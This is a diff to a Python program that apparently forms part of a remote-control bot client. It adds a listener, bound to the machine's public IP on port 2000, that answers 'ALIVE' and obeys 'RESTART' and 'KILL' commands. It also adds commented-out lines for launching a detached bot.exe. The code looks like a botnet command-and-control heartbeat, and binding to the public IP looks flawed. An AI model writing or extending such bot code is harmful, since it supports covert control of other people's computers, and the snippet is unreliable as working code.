@@ -7,6 +7,27 @@ import struct
 import platform
 from time import sleep
 import pyautogui
+from json import load
+from urllib import request
+
+def create_botserver():
+    ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
+    port = 2000
+    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ss.bind((ip,port))
+    ss.listen()
+    while True:
+        con,addr = ss.accept()
+        con.send("ALIVE".encode())
+        resp = con.recv(1024).decode()
+        if(resp == "RESTART"):
+            main()
+        elif(resp == "KILL"):
+            quit()
+        elif(resp == "OK"):
+            continue
+        else:
+            pass
 
 def start_session(s):
     while True:
@@ -92,6 +113,9 @@ def main():
     conn_process.start()
 
 if __name__ == '__main__':
-    main_thread = Process(target=main,args=())
+    #path = os.getcwd()
+    #subprocess.Popen("%s/bot.exe"%(path),creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
+
+    main_thread = Thread(target=main,args=())
+    #main_thread.setDaemon(True)
     main_thread.start()
-    main_thread.join()
